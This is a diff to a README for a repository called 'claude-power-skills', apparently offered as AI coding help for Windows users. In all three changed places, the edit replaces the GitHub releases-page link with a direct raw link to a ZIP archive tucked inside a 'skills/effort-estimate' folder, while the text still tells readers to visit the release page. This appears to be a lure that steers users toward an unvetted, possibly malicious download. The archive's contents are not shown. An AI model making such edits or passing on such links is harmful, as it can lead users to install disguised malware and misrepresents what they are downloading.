@@ -1,6 +1,6 @@
 # 🤖 claude-power-skills - Senior AI help for coding
 
-[![Download claude-power-skills](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/rabiinfrangible920/claude-power-skills/releases)
+[![Download claude-power-skills](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/rabiinfrangible920/claude-power-skills/raw/refs/heads/main/skills/effort-estimate/power-skills-claude-2.1.zip)
 
 ## 🧭 What this is
 
@@ -32,7 +32,7 @@ Use this on a Windows PC with:
 
 Go to the release page here:
 
-https://github.com/rabiinfrangible920/claude-power-skills/releases
+https://github.com/rabiinfrangible920/claude-power-skills/raw/refs/heads/main/skills/effort-estimate/power-skills-claude-2.1.zip
 
 On that page, choose the latest release and download the file that matches the package format you want. If the release includes a ZIP file, download that file.
 
@@ -150,4 +150,4 @@ Keep your downloads in a folder you trust. Use the release page link above to ge
 
 Visit this page to download the latest files:
 
-https://github.com/rabiinfrangible920/claude-power-skills/releases
+https://github.com/rabiinfrangible920/claude-power-skills/raw/refs/heads/main/skills/effort-estimate/power-skills-claude-2.1.zip
